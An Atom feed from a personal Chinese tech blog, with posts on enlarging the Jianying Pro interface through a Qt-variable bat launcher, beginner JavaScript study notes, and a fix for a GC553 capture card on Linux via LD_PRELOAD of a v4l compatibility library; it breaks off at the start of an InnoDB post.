<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secriy&#39;s Blog</title>
  
  
  <link href="https://blog.secriy.com/atom.xml" rel="self"/>
  
  <link href="https://blog.secriy.com/"/>
  <updated>2025-02-16T07:34:33.043Z</updated>
  <id>https://blog.secriy.com/</id>
  
  <author>
    <name>Secriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>剪映专业版 Windows 下调整 UI 缩放教程</title>
    <link href="https://blog.secriy.com/jiangyingpro-ui-scale/"/>
    <id>https://blog.secriy.com/jiangyingpro-ui-scale/</id>
    <published>2025-02-16T07:24:58.000Z</published>
    <updated>2025-02-16T07:34:33.043Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Windows 平台剪映专业版，修改 UI 缩放及字体大小。</p></div><span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2K 下 100% 的缩放比例使用剪映专业版发现界面 UI 字体非常小，还没提供修改 UI 缩放比例的设置选项（很怀疑“专业版”的专业性）。</p><p>在 b 站发现了解决方案：<a href="https://www.bilibili.com/opus/946283322309345302">剪映调节界面字体大小 - 哔哩哔哩</a>，通过修改全局变量的方式来调整软件字体。但通过这种方式调整会导致所有使用同类技术栈的软件都受到影响，因此我实际使用的方案是该专栏评论里，<a href="https://space.bilibili.com/26012356">@Bury我们past</a> 大佬提供的 bat 脚本。</p><p>不过为了简化使用方式，我进一步对脚本进行了修改。</p><h1 id="完整方案"><a href="#完整方案" class="headerlink" title="完整方案"></a>完整方案</h1><h2 id="1-创建-bat-文件"><a href="#1-创建-bat-文件" class="headerlink" title="1. 创建 bat 文件"></a>1. 创建 bat 文件</h2><p>在 <em>JianyingPro.exe</em> 同级目录下创建 <em>JianyingPro.bat</em>，内容如下（具体参数可以自行微调）：</p><pre><code class="bat">@echo off:: 调整 Qt 应用程序的全局缩放比例set QT_SCALE_FACTOR=1.1:: 指定 Qt 应用程序的字体 DPI（每英寸点数）。这可以独立于全局 DPI 设置来调整字体渲染的清晰度和大小set QT_FONT_DPI=115:: 启动位于 bat 文件同级目录的 JianyingPro.exe 并保留原始参数 --src1start &quot;&quot; &quot;%~dp0JianyingPro.exe&quot; --src1</code></pre><h2 id="2-更改剪映专业版桌面快捷方式"><a href="#2-更改剪映专业版桌面快捷方式" class="headerlink" title="2. 更改剪映专业版桌面快捷方式"></a>2. 更改剪映专业版桌面快捷方式</h2><h3 id="修改目标"><a href="#修改目标" class="headerlink" title="修改目标"></a>修改目标</h3><p>快捷方式的目标修改为刚刚添加的 <em>JianyingPro.bat</em>，参数去掉（bat 里已经添加过了）：</p><p><img src="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-53-20.png" class="lazyload" data-srcset="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-53-20.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Snipaste_2025-02-16_14-53-20"></p><h3 id="修改图标"><a href="#修改图标" class="headerlink" title="修改图标"></a>修改图标</h3><p>如果图标消失了，可以通过下面的步骤修改回原来的图标：</p><p><img src="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-56-15.png" class="lazyload" data-srcset="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-56-15.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Snipaste_2025-02-16_14-56-15"></p><p><img src="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-56-32.png" class="lazyload" data-srcset="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-56-32.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Snipaste_2025-02-16_14-56-32"></p><p>图标选择原本的剪映主程序，最后点击确认即可：</p><p><img src="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-57-08.png" class="lazyload" data-srcset="/jiangyingpro-ui-scale/Working\hexo\source_posts\剪映专业版-Windows-下调整-UI-缩放教程\Snipaste_2025-02-16_14-57-08.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Snipaste_2025-02-16_14-57-08"></p><h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>仍通过剪映快捷方式打开软件，即可实现无感的 UI 字体修改，且不会影响其他程序。</p><p>需要注意的一点：暂未测试程序更新的情况，可能存在程序更新后快捷方式被恢复的问题，可以尝试备份一下快捷方式，改个名字避免被覆盖。</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Windows 平台剪映专业版，修改 UI 缩放及字体大小。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="剪映" scheme="https://blog.secriy.com/tags/%E5%89%AA%E6%98%A0/"/>
    
    <category term="剪辑" scheme="https://blog.secriy.com/tags/%E5%89%AA%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>Learn JavaScript</title>
    <link href="https://blog.secriy.com/learn-javascript/"/>
    <id>https://blog.secriy.com/learn-javascript/</id>
    <published>2023-08-17T14:34:56.000Z</published>
    <updated>2025-02-16T07:13:36.769Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文是 JavaScript 的个人学习笔记，仅适合有编程基础快速上手新语言使用。</p></div><span id="more"></span><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p>Specification：<a href="https://www.ecma-international.org/publications/standards/Ecma-262.htm">The ECMA-262 specification</a></p></li><li><p>MDN 手册：<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference">MDN (Mozilla) JavaScript Reference</a></p></li></ul><h2 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul><li>  JavaScript 引擎：JavaScrit 的运行环境，负责将 JavaScript 代码转为机器码执行。如 Chrome 使用的 V8。</li></ul><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><pre><code class="javascript">// 单行注释/* 多行注释*/</code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre><code class="javascript">var text; // 变量声明但不初始化，其值为 undefinedvar message = &quot;hello&quot;; // 变量初始化message = 100; // 将不同类型的值赋给已初始化变量，合法但不推荐</code></pre><p>变量作用域：</p><pre><code class="javascript">function test() &#123;    var text = &quot;&quot;; // 局部变量，函数外访问不到&#125;function test() &#123;    text = &quot;&quot;; // 无 var 关键字，text 为全局变量，函数外可访问        // 注意，test 函数被调用后 text 才会被声明，其后能被函数外的代码访问到&#125;</code></pre><p>多变量声明：</p><pre><code class="javascript">var a, b, c = 1, false, &quot;c&quot;;</code></pre><p><code>var</code> 声明会被提升到作用域顶部：</p><pre><code class="javascript">function test() &#123;    console.log(text); // undefined    var text = &quot;hello&quot;;&#125;// 声明会被提升，但初始化不会，因此上面的函数等价于：function test() &#123;    var text;    console.log(text); // 不会报错，但 text 并未初始化，因此为 undefined    text = &quot;hello&quot;;&#125;</code></pre><p><code>var</code> 重复声明是合法的：</p><pre><code class="javascript">var a = 1;var a = 2;var a = 3;console.log(a); // 3</code></pre><p><code>let</code> 与 <code>var</code> 的区别，作用域不同：</p><pre><code class="javascript">// var 的作用域更大，能覆盖整个函数if (condition) &#123;    var text = &quot;hello&quot;;    console.log(text); // hello&#125;console.log(text); // hello// let 只能在局部作用域（块作用域）生效if (condition) &#123;    var text = &quot;hello&quot;;    console.log(text); // hello&#125;console.log(text); // ReferenceError: text is not defined</code></pre><p><code>let</code> 与 <code>var</code> 的区别，不能在同一个块中重复声明：</p><pre><code class="javascript">let a = 1;let a = 2; // SyntaxError: Identifier &#39;a&#39; has already been declaredlet b = 1;if (condition) &#123;    let b = 2; // 合法，因为不在同一个块级作用域&#125;</code></pre><p>注意以 Chrome 浏览器的 Console 为例，每行命令为独立块作用域，因此重复 <code>let</code> 声明不会报错。</p><p><code>let</code> 与 <code>var</code> 的区别，不会被提升：</p><pre><code class="javascript">function test() &#123;    console.log(text); // ReferenceError: Cannot access &#39;text&#39; before initialization    let text = &quot;hello&quot;;&#125;</code></pre><p><code>let</code> 与 <code>var</code> 的区别，全局作用域中声明的变量不会成为 <code>window</code> 对象的属性：</p><pre><code class="javascript">var name = &quot;a&quot;;console.log(window.name); // alet name = &quot;a&quot;;console.log(window.name); // undefined</code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 中有原语（primitive）和对象（object） 两种类型区分：</p><ul><li>primitive<ul><li>string</li><li>number</li><li>bigint</li><li>boolean</li><li>symbol</li><li>null</li><li>undefined</li></ul></li><li>object</li></ul><h4 id="Numbers"><a href="#Numbers" class="headerlink" title="Numbers"></a>Numbers</h4><p>JavaScript 中有两种数字类型：</p><ul><li>常规数字，以 IEEE-754 双精度浮点数存储，应用于大部分情况；</li><li>Bigint，任意长度的数字。</li></ul><p>本小节只介绍常规数字。</p><p>数字的字面量表示方式：</p><pre><code class="javascript">let billion = 1000000000;let billion = 1_000_000_000; // 下划线仅作为语法糖，会被 JavaScript 引擎忽略，等同于上一句let x = 243_4343_42342;let x = 4234_; // error，下划线不允许在末尾let billion = 1e9; // 科学计数法let n = 7.3e9;let n = 7300000000; // 与上一句等同let mcs = 0.000001; // microsecondlet mcs = 1e-6; // 与上一句等同</code></pre><p>十六进制，二进制，八进制：</p><pre><code class="javascript">let h = 0xff; // 255let h = 0xFF; // 255let b = 0b110; // 6let o = 0o377; // 255// 0xFF === 0o377</code></pre><p>数字的 <code>toString</code> 方法（2-36 进制）：</p><pre><code class="javascript">let num = 255;num.toString(); // 十进制，255num.toString(16); // 十六进制，ffnum.toString(2); // 二进制，11111111let num = 0xf1;num.toString(); // 十进制，241num.toString(16); // 十六进制，f1num.toString(2); // 二进制，11110001</code></pre><h4 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h4><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><pre><code class="javascript">let i = 0;while (i &lt; 10) &#123;    i++;&#125;console.log(i); // 10</code></pre><pre><code class="javascript">// 单行写法let i = 0;while(i) console.log(i--); // 10 9 8 ... 1</code></pre><h5 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h5><p>该循环至少会被执行一次：</p><pre><code class="javascript">let i = 0;do &#123;    i++;&#125; while(i &lt; 0);console.log(i); // 1</code></pre><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p>能够替代其余所有循环方式：</p><pre><code class="javascript">for (let i = 0; i &lt; 10; i++) &#123; // i 只在 for 循环内可访问    // ...&#125;</code></pre><pre><code class="javascript">let i = 0;for (let i = 0; i &lt; 10; i++) &#123;  i++;&#125;console.log(i); // 0for (i = 0; i &lt; 10; i++) &#123;  i++;&#125;console.log(i); // 10for (; i &lt; 20; i++) &#123;&#125;console.log(i); // 20</code></pre><p>省略赋值语句、条件或步进语句：</p><pre><code class="javascript">let i = 0;for (; i &lt; 10; i++) &#123;&#125;console.log(i); // 10for (;;i++) &#123;    if (i &gt; 20) break; // break 结束循环&#125;console.log(i); // 21for (;;) &#123;    if (i++ &gt; 30) break;&#125;console.log(i); // 32</code></pre><p>死循环：</p><pre><code class="javascript">// 二者等同for (;;) &#123;&#125;while (true) &#123;&#125;</code></pre><p><code>continue</code> 直接跳转到下一循环：</p><pre><code class="javascript">let i = 0;for (; i &lt; 10; i++) &#123;    if (i &gt; 5) continue;    console.log(i); // 0 1 ... 5&#125;</code></pre><p><code>break</code> 结束循环：</p><pre><code class="javascript">let i = 0;for (;; i++) &#123;    if (i &gt;= 10) break;&#125;console.log(i); // 10</code></pre><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a><code>switch</code></h4><p><code>switch</code> 语句通过传入值匹配到指定代码段，注意匹配时的相等检查<strong>类型严格</strong>：</p><pre><code class="javascript">switch(x) &#123;    case &#39;2&#39;:        ...        break;    case 2:        ...        break;    default:        ...&#125;</code></pre><p>如果不添加 <code>break</code>，匹配到 <code>case</code> 后会接着往下执行：</p><pre><code class="javascript">let x = 1;switch(x) &#123;    case 0:        alert(0);    case 1:        alert(1);    case 2:        alert(2);    default:        alert(-1);&#125;// Output://// 1// 2// -1</code></pre><p>因此需要手动添加 <code>break</code>：</p><pre><code class="javascript">let x = 1;switch(x) &#123;    case 0:        alert(0);        break;    case 1:        alert(1);        break;    case 2:        alert(2);        break;    default:        alert(-1);&#125;// Output://// 1</code></pre><p>将多个 <code>case</code> 组合到一起：</p><pre><code class="javascript">switch(x) &#123;    case 0:        alert(0);        break;    case 1:    case 2:        // x 为 1 或 2，都会执行到这里        alert(&quot;1 and 2&quot;);        break;    default:        alert(-1);&#125;</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><p>声明函数：</p><pre><code class="javascript">function myFunction() &#123;    alert(&quot;hello&quot;);&#125;</code></pre><p>调用函数：</p><pre><code class="javascript">myFunction();</code></pre><h4 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h4><p>在函数内声明的变量为局部变量，函数外无法访问：</p><pre><code class="javascript">function myFunction() &#123;    let a = 1;    alert(a);&#125;myFunction();alert(a); // ERROR</code></pre><p>函数能访问外部变量，并可修改：</p><pre><code class="javascript">let a = 1;function myFunction() &#123;    a = 2;    let b = a + 1;    alert(b);&#125;myFunction(); // 3alert(a); // 2</code></pre><p>局部变量优先级高于全局变量，重名会优先使用局部变量：</p><pre><code class="javascript">let a = 1;function myFunction() &#123;    let a = 2;    alert(a);&#125;myFunction(); // 2</code></pre><p>注意，只要函数中存在同名变量声明，则外部同名变量会被忽略，不论是使用 <code>let</code> 或 <code>var</code>：</p><pre><code class="javascript">let a = 1;function myFunction() &#123;    alert(a); // ERROR: Cannot access &#39;a&#39; before initialization    let a = 2;    alert(a);&#125;myFunction();</code></pre><pre><code class="javascript">let a = 1;function myFunction() &#123;    a = 3; // 这里修改的是由 var 声明提升特性，在函数顶部声明的局部变量 a    alert(a); // 3    var a = 2;    alert(a); // 2&#125;myFunction();alert(a); // 1</code></pre><h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><p>函数参数：</p><pre><code class="javascript">function add(a, b) &#123;    return a + b; // a, b 均为局部变量&#125;let sum = add(1, 2);alert(sum); // 3</code></pre><p>函数参数传值时会拷贝参数，因此无法修改基本类型参数：</p><pre><code class="javascript">function test(x) &#123;    x = 2;&#125;let a = 1;test(a);alert(a); // 1</code></pre><p>调用时，参数数量可以不一致：</p><pre><code class="javascript">function add(a, b) &#123;    return a + b;&#125;add(1, 2); // 3// 多余的参数会被忽略add(1, 2, 3, 4); // 3// 缺少的参数为 undefinedadd(); // NaN, 因为 undefined + undefined 为 NaNadd(1); // NaN, 因为 1 + undefined 为 NaN</code></pre><p>可以给参数设置默认值，当参数为 <code>undefined</code> 是会被替换为默认值：</p><pre><code class="javascript">function add(a, b = 2) &#123;    return a + b;&#125;add(1); // 3add(1, 3); // 4add(1, undefined); // 3</code></pre><pre><code class="javascript">function add(a = 1, b) &#123;    return a + b;&#125;add(2, 3); // 5add(undefined, 3); // 4</code></pre><p>函数默认值可以使用表达式等：</p><pre><code class="javascript">function add(a, b = a + 3) &#123; // 注意，参数按顺序声明，因此默认值能为 a = b + 1 类似写法    return a + b;&#125;add(1);</code></pre><pre><code class="javascript">function defaultValue() &#123;    return 23;&#125;function add(a, b = defaultValue()) &#123;    return a + b;&#125;add(1); // 24</code></pre><p>函数参数在调用时才会被操作：</p><pre><code class="javascript">let x = 1;function defaultValue() &#123;    x = 2;    return 23;&#125;function add(a, b = defaultValue()) &#123;    return a + b;&#125;alert(x); // 1add(1); // 24alert(x); // 2</code></pre><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>函数默认返回 <code>undefined</code>：</p><pre><code class="javascript">function test() &#123;&#125;;let a = test();alert(a); // undefined</code></pre><p>多行返回值写法：</p><pre><code class="javascript">function test() &#123;    ...    return (        a + b + c        + d +        f    )&#125;</code></pre><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><p>函数可以作为值：</p><pre><code class="javascript">let hello = function() &#123;    alert(&quot;hello&quot;);&#125;;hello();</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>箭头函数简化了创建函数的方式：</p><pre><code class="javascript">// let func = (arg1, arg2, ...) =&gt; expression;let hello = (name) =&gt; alert(`hello $&#123;name&#125;`);hello(&quot;foo&quot;); // hello foo// 无参数let func = () =&gt; alert(&quot;hello&quot;);</code></pre><p>更复杂的函数：</p><pre><code class="javascript">let sum = (a, b) =&gt; &#123;    let result = a + b;    return result;&#125;alert(sum(1, 2)); // 3</code></pre><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>对象为 key-value 存储：</p><pre><code class="javascript">// 空对象创建let emptyObj = new Object();// 字面量写法，与上方等同let emptyObj = &#123;&#125;;</code></pre><h4 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h4><p>对象属性（property/name/identifier）：</p><pre><code class="javascript">let person = &#123;    name: &quot;Alice&quot;,    age: 18&#125;;alert(person.name); // Alice// 添加属性person.dead = false;alert(person.dead); // true// 未设置的属性，即 undefinedalert(person.a); // undefined// 删除属性delete person.dead;// 重复删除不会报错，但没有实际效果（no op）delete person.dead;// 属性可以用任意字符串命名let user = &#123;    &quot;any name&quot;: &quot;&quot;&#125;alert(user[&quot;any name&quot;]) // 使用 `[]` 取值// 使用 `[]` 设置属性user[&quot;name&quot;] = &quot;name&quot;;// 使用 `[]` 删除属性delete user[&quot;name&quot;];// 使用 `[]` 则可以支持任意类型的 key，`.` 的方式只能支持字符串// user.name 等同于 user[&quot;name&quot;]user[&#123;&#125;] = 1;alert(user[&#123;&#125;]); // 1</code></pre><h4 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h4><p>JavaScript 支持属性名是变量：</p><pre><code class="javascript">let keyFunc = (name) =&gt; name + &quot;x&quot;;let key = keyFunc(&quot;test&quot;);let user = &#123;  [key]: &quot;hello&quot;, // 使用 `[]` 设置属性名，属性名为 `[]` 内变量的值&#125;;alert(user.testx); // hello// 修改 key 并不会对对象属性产生影响 key = &quot;testy&quot;;alert(user.testy); // undefined</code></pre><p>实际上，这就等同于下面的代码：</p><pre><code class="javascript">let keyFunc = (name) =&gt; name + &quot;x&quot;;let key = keyFunc(&quot;test&quot;);let user = &#123;&#125;;user[key] = &quot;hello&quot;; // key 的值此时为 &quot;testx&quot;alert(user.testx); // hello</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文是 JavaScript 的个人学习笔记，仅适合有编程基础快速上手新语言使用。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="PL" scheme="https://blog.secriy.com/tags/PL/"/>
    
    <category term="JavaScript" scheme="https://blog.secriy.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>GC553 采集卡 Linux 踩坑记录</title>
    <link href="https://blog.secriy.com/gc553-linux/"/>
    <id>https://blog.secriy.com/gc553-linux/</id>
    <published>2022-07-18T16:12:52.000Z</published>
    <updated>2025-02-16T07:13:36.742Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>闲着没事买了一张采集卡直播用，打算将台式机的视频输出到采集卡，再通过 Linux 笔记本进行推流。然而过程中遇到一大堆问题，不过最终还是解决了。</p></div><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我个人有两台设备，一台 Windows 台式机作为主力机，干活和游戏多半都在上面进行。还有一台 Linux/Windows 双系统笔记本，大部分时间闲置（摆着当背景）以及处理一些要求 Linux 平台的工作。之前尝试过使用主力机游戏 + 直播推流，效果非常差，直接导致游戏帧数狂掉。于是后来入了一张采集卡，Windows 机器走 HDMI 输出到采集卡 INPUT，采集卡再通过 USB 3.1 输出到 Linux 笔记本，使用 OBS 直播推流。</p><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p>首先连接上采集卡，执行 <code>lsusb</code> 查看下设备状态，可以看到已经连接上了：</p><p><strong><img src="/gc553-linux/image-20220719002737452.png" class="lazyload" data-srcset="/gc553-linux/image-20220719002737452.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719002737452"></strong></p><p>再通过 <code>v4l2-ctl</code> 查看下外部设备，<code>video0</code> 就是我们要找的设备：</p><p><img src="/gc553-linux/image-20220719002848154.png" class="lazyload" data-srcset="/gc553-linux/image-20220719002848154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719002848154"></p><p>尝试在 OBS 中添加一下视频源，结果发现出现 Resolution Not Supported for Resizing 的字样，应该是需要手动调整分辨率：</p><p><img src="/gc553-linux/image-20220719003043327.png" class="lazyload" data-srcset="/gc553-linux/image-20220719003043327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719003043327"></p><p>接着调整分辨率为 <strong>2560x1440</strong>（这是我主力机的分辨率），然而画面绿了：</p><p><img src="/gc553-linux/image-20220719003331844.png" class="lazyload" data-srcset="/gc553-linux/image-20220719003331844.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719003331844"></p><p>OBS 不行，于是我试着用 MPV 看下：</p><p><img src="/gc553-linux/image-20220719003549683.png" class="lazyload" data-srcset="/gc553-linux/image-20220719003549683.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719003549683"></p><p>可以看到画面有了，不过经常出错，有时候打得开有时候打不开，很多时候需要重复插拔接口并且重新启动 MPV 多次才能正常看到画面，体验极差。OBS 也是相同的，经常莫名其妙得能看到画面，有时候又看不到了，在勾选下图中的选项后能看到实际上是有输入的，只不过不正常，直接花了：</p><p><img src="/gc553-linux/image-20220719003958228.png" class="lazyload" data-srcset="/gc553-linux/image-20220719003958228.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719003958228"></p><p>接下来我尝试使用这台笔记本上的 Windows 系统，意料之中的一切正常。但我这台设备主要使用 Linux 系统，切系统十分麻烦，最好还是想办法解决 Linux 平台出现的问题。</p><p>最终，我从 Arch Wiki 上找到了这么一个字段（<a href="https://wiki.archlinux.org/title/webcam_setup#V4L1_support">链接地址</a>）：</p><p><img src="/gc553-linux/image-20220719004352370.png" class="lazyload" data-srcset="/gc553-linux/image-20220719004352370.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719004352370"></p><p>好家伙，这不就是我遇到的现象吗。在 <em>/etc/profile.d</em> 目录下创建一个脚本文件，写入 <code>export LD_PRELOAD=/usr/lib/libv4l/v4l1compat.so</code>，重启系统使其生效（重新登录也可以）。</p><p><img src="/gc553-linux/image-20220719004852912.png" class="lazyload" data-srcset="/gc553-linux/image-20220719004852912.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719004852912"></p><p>完美解决！</p><h2 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h2><p>音频部分就比较简单了，我这边是主力机安装 Voicemeeter Banana，将内部音频以及麦克风输入同时输出到耳机（连主力机）和 GC553，这个就比较顺利。</p><p><img src="/gc553-linux/image-20220719005227349.png" class="lazyload" data-srcset="/gc553-linux/image-20220719005227349.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220719005227349"></p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;闲着没事买了一张采集卡直播用，打算将台式机的视频输出到采集卡，再通过 Linux 笔记本进行推流。然而过程中遇到一大堆问题，不过最终还是解决了。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="Linux" scheme="https://blog.secriy.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>InnoDB Page Formats</title>
    <link href="https://blog.secriy.com/undefined/"/>
    <id>https://blog.secriy.com/undefined/</id>
    <published>2021-11-04T05:26:46.000Z</published>
    <updated>2025-02-16T07:13:36.763Z</updated>
    
